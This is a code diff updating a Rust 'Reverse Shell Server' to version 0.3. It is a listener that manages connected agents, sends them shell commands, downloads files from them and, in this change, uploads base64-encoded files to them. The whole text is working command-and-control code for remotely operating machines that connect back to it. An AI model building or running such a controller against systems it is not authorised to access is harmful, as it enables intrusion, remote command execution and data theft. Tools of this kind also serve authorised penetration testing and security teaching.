@@ -1,9 +1,9 @@
-use std::net::{Ipv4Addr, TcpListener, TcpStream, SocketAddr, SocketAddrV4};
-use std::io::{BufRead, BufReader, Write};
-use std::sync::{Arc, Mutex};
-use std::thread;
 use clap::{Arg, Command};
 use std::fs::File;
+use std::io::{BufRead, BufReader, Read, Write};
+use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, TcpListener, TcpStream};
+use std::sync::{Arc, Mutex};
+use std::thread;
 
 /* Client info struct. */
 struct ClientInfo {
@@ -15,16 +15,61 @@ struct ClientInfo {
 
 /* Remove the client from the list. */
 fn remove_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize) {
+
     let mut lock = clients.lock().unwrap();
+
+    // Remove the client from the list by searching for the client ID.
     if let Some(pos) = lock.iter().position(|c| c.id == client_id) {
+
         lock.remove(pos);
+
     }
+
+}
+
+/* Function to send the commands to the clients. */
+fn send_command_to_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize, command: &str,) -> Result<(), String> {
+
+    // Lock the client list.
+    let mut lock = clients
+        .lock()
+        .map_err(|_| "Failed to lock clients mutex".to_string())?;
+
+    // Find the client by ID.
+    if let Some(client) = lock.iter_mut().find(|c| c.id == client_id) {
+    
+        let mut cmd_to_send = command.to_string();
+    
+        // Add null terminator.
+        cmd_to_send.push('\0');
+
+        // Lock the client stream.
+        let mut stream = client
+            .stream
+            .lock()
+            .map_err(|_| "Failed to lock client stream".to_string())?;
+
+        // Send the command.
+        stream
+            .write_all(cmd_to_send.as_bytes())
+            .map_err(|e| format!("Failed to send command to client {}: {}", client_id, e))?;
+
+        println!("Command sent to client {}", client_id);
+        Ok(())
+
+    } else {
+        
+        Err(format!("No client with ID {} found.", client_id))
+    
+    }
+
 }
 
 fn main() {
+    
     // CLI arguments.
     let matches = Command::new("Reverse Shell Server")
-        .version("0.2")
+        .version("0.3")
         .author("Duane Dunston <thedunston@gmail.com>")
         .about("Reverse Shell Server")
         .arg(
@@ -77,93 +122,134 @@ fn main() {
 
     // Spawn a thread to handle user commands
     thread::spawn(move || {
+    
         let stdin = std::io::stdin();
+    
         loop {
+    
             // Print prompt
             print!("> ");
             std::io::stdout().flush().unwrap();
 
             let mut input_line = String::new();
             if stdin.read_line(&mut input_line).is_err() {
+
                 eprintln!("Failed to read from stdin.");
                 continue;
+
             }
 
             let trimmed = input_line.trim().to_string();
             {
+
                 // Lock and update the shared line with the new command.
                 let mut l = line_for_commands.lock().unwrap();
                 *l = trimmed;
+
             }
 
-            // Now read the line from the shared variable
+            // Now read the line from the shared variable.
             let current_line = {
+
                 let l = line_for_commands.lock().unwrap();
+
                 l.clone()
+
             };
 
-            if current_line == "clients" {
-                // Print the list of connected clients.
-                let lock = clients_for_commands.lock().unwrap();
-                if lock.is_empty() {
-                    println!("No clients connected.");
-                } else {
-                    println!("ID | Agent Name | Address");
-                    println!("-------------------------");
-                    for c in lock.iter() {
-                        println!("{} | {} | {}", c.id, c.agent_name, c.address);
-                    }
-                }
-            } else {
+            // Split the user input into the ID of the client and the command to send.
+            let mut parts = current_line.splitn(2, ' ');
 
-                // Split the user input into the ID of the client and the command to send.
-                let mut parts = current_line.splitn(2, ' ');
-                
-                // ID of the client.
-                let id_str = parts.next().unwrap_or("");
+            // ID of the client.
+            let id_str = parts.next().unwrap_or("");
 
-                // Command to send.
-                let cmd = parts.next().unwrap_or("");
+            // Check if the user wants to upload a file.
+            let search_string = "upload ";
 
-                // Check if the ID is a valid integer.
+            // Check if the search string is in the current line.
+            if current_line.contains(search_string) {
+
+                // Split the line into the command and the paths.
+                let parts: Vec<&str> = current_line.split_whitespace().collect();
+                let rfile = parts[2];
+                let lpath = parts[3];
+
+                // Read the file.
+                let mut file = File::open(lpath).unwrap();
+                let mut file_buf = Vec::new();
+                file.read_to_end(&mut file_buf).unwrap();
+
+                // Base64 encode the file contents.
+                let encoded = base64::encode(&file_buf);
+
+                // Convert the encoded string to bytes.
+                let new_file_buf = encoded.as_bytes();
+
+                // Get the file size.
+                let file_size = file_buf.len();
+
+                // Command line with the file size.
+                let upload_command = format!("upload {} {} ", rfile, file_size);
+                let mut out_buffer = upload_command.into_bytes();
+
+                // Add the file contents.
+                out_buffer.extend_from_slice(&new_file_buf);
+
+                // Convert output buffer to String.
+                let encoded = String::from_utf8(out_buffer).unwrap();
+            
+                // Send to the client.
                 if let Ok(id) = id_str.parse::<usize>() {
-                    
-                    // Lock the client's mutex.
-                    let mut lock = clients_for_commands.lock().unwrap();
 
-                    // Find the client by its ID.
-                    if let Some(client) = lock.iter_mut().find(|c| c.id == id) {
+                    if let Err(e) = send_command_to_client(&clients_for_commands, id, &encoded) {
                     
-                        // Send the command to the client.
-                        let mut cmd_to_send = cmd.to_string();
-                        cmd_to_send.push('\0');
-
-                        // Lock and write the command to the client's stream.
-                        let mut stream = client.stream.lock().unwrap();
-                    
-                        // Write the command to the client's stream.
-                        if let Err(e) = stream.write_all(cmd_to_send.as_bytes()) {
-                    
-                            eprintln!("Failed to send command to client {}: {}", id, e);
-                    
-                        } else {
-                    
-                            println!("Command sent to client {}", id);
-                    
-                        }
-                    
-                    } else {
-                    
-                        println!("No client with ID {} found.", id);
+                        eprintln!("{}", e);
                     
                     }
-                
-                } else {
-                
-                    println!("Unknown command. Type 'clients' to list clients.");
                 
                 }
             
+            } else if current_line == "clients" {
+            
+                // Print the list of connected clients.
+                let lock = clients_for_commands.lock().unwrap();
+            
+                if lock.is_empty() {
+            
+                    println!("No clients connected.");
+            
+                } else {
+            
+                    println!("ID | Agent Name | Address");
+                    println!("-------------------------");
+
+                    for c in lock.iter() {
+            
+                        println!("{} | {} | {}", c.id, c.agent_name, c.address);
+            
+                    }
+            
+                }
+            
+            } else {
+            
+                // Command to send.
+                let cmd = parts.next().unwrap_or("");
+
+                if let Ok(id) = id_str.parse::<usize>() {
+            
+                    if let Err(e) = send_command_to_client(&clients_for_commands, id, cmd) {
+            
+                        eprintln!("{}", e);
+            
+                    }
+            
+                } else {
+            
+                    println!("Unknown command. Type 'clients' to list clients.");
+            
+                }
+           
             }
         
         }
@@ -175,12 +261,12 @@ fn main() {
 
     // Loop over incoming connections.
     for stream_result in tcplistener.incoming() {
-
+    
         // Handle the connection.
         match stream_result {
-        
+    
             Ok(client_stream) => {
-        
+    
                 // Get the client's address.
                 let client_address = client_stream.peer_addr().unwrap();
 
@@ -200,7 +286,6 @@ fn main() {
                 next_id += 1;
 
                 {
-
                     // Add the new client to the list.
                     let mut clients_lock = clients.lock().unwrap();
                     clients_lock.push(ClientInfo {
@@ -209,7 +294,6 @@ fn main() {
                         address: client_address,
                         stream: Arc::clone(&write_stream_arc),
                     });
-
                 }
 
                 let clients_for_thread = Arc::clone(&clients);
@@ -223,66 +307,72 @@ fn main() {
 
                     // Read the agent name from the client.
                     if let Err(e) = reader.read_until(b'\0', &mut agent_buf) {
-                    
+    
                         eprintln!("Error reading agent name: {}", e);
+    
                         remove_client(&clients_for_thread, client_id);
+    
                         return;
-                    
+    
                     }
 
                     // Convert the agent name to a string.
-                    let agent_name = String::from_utf8_lossy(&agent_buf).trim_end_matches('\0').trim().to_string();
-                         
-                   
+                    let agent_name = String::from_utf8_lossy(&agent_buf)
+                        .trim_end_matches('\0')
+                        .trim()
+                        .to_string();
+
                     {
                         let mut clients_lock = clients_for_thread.lock().unwrap();
 
                         // Find the client by its ID and update its agent name.
                         if let Some(c) = clients_lock.iter_mut().find(|c| c.id == client_id) {
- 
+    
                             c.agent_name = agent_name.clone();
- 
+    
                         }
- 
+    
                     }
 
                     println!("Client {} named: {}", client_id, agent_name);
 
                     // Now read messages in a loop.
                     loop {
-                        
+    
                         // Read the message from the client.
                         let mut buf: Vec<u8> = Vec::new();
                         let bytes_read = match reader.read_until(b'\0', &mut buf) {
-                        
+    
                             Ok(b) => b,
                             Err(e) => {
-                        
                                 eprintln!("Read error from client {}: {}", client_id, e);
                                 break;
-                        
+    
                             }
-                        
+    
                         };
 
                         // If the client disconnected, break the loop.
                         if bytes_read == 0 {
-
+    
                             println!("Client {} disconnected", client_id);
                             break;
-                        
+    
                         }
 
                         // Convert the cmd results to a string.
-                        let mut message = String::from_utf8_lossy(&buf).trim_end_matches('\0').trim().to_string();
+                        let mut message = String::from_utf8_lossy(&buf)
+                            .trim_end_matches('\0')
+                            .trim()
+                            .to_string();
                         message.push('\n');
 
                         // Lock and read the current line from the shared variable (the input from the user in the loop above.)
                         let current_line = {
-                    
+    
                             let l = line_for_thread.lock().unwrap();
                             l.clone()
-                    
+    
                         };
 
                         // Split the current line into tokens.
@@ -290,61 +380,69 @@ fn main() {
 
                         // Check we have at least two tokens: ID and command
                         if tokens.len() < 2 {
-                    
+    
                             println!("No valid command provided.");
                             return;
-                    
+    
                         }
-
-                        // This checks the "operation" to perform for the client and determins what to do.
-                        // If downloading a file, then save the file, else execute a command.
-                        
+                    
                         // If the user types: 0 download remoteFile localFile, then "download" is the "operation."
                         let todo = tokens[1];
 
                         // Remote file path.
-                        let rfile = if tokens.len() > 2 { tokens[2] } else { "" };
-                        
+                        //let rfile = if tokens.len() > 2 { tokens[2] } else { "" };
+
                         // Local file path.
                         let lpath = if tokens.len() > 3 { tokens[3] } else { "" };
-                    
-                        match todo {
 
+                        match todo {
+                          
                             "download" => {
-                            
                                 // Save the message to the file.
                                 let mut file = File::create(lpath).unwrap();
-                    
+
                                 // Write the message to the local file.
                                 file.write_all(message.as_bytes()).unwrap();
 
                                 if let Err(e) = file.flush() {
-                            
+
                                     eprintln!("Failed to create file: {}", e);
-                            
+
                                 } else {
-                            
+
                                     println!("File saved to {}", lpath);
-                            
+
                                 }
-                            
+
                             }
 
                             "exec" => {
-                            
+
                                 // Print the results returned from the client.
                                 println!("Received from client {}: \"{}\"", client_id, message);
-                            
+
+                            }
+
+                            "upload" => {
+                          
+                                // Print the results returned from the client.
+                                println!(
+
+                                    "Upload results from client {}: \"{}\"",
+                                    client_id, message
+
+                                );
+
                             }
 
                             _ => {
-                            
+
                                 // If the user input doesn't match download or exec, just print unknown command
                                 // The client is still connected, we do not remove them
                                 println!("Unknown command.");
-                            
+
                             }
-                        
+
                         }
 
                     }
@@ -357,9 +455,9 @@ fn main() {
             }
 
             Err(e) => eprintln!("Accept error: {}", e),
-        
+
         }
-    
+
     }
 
 }
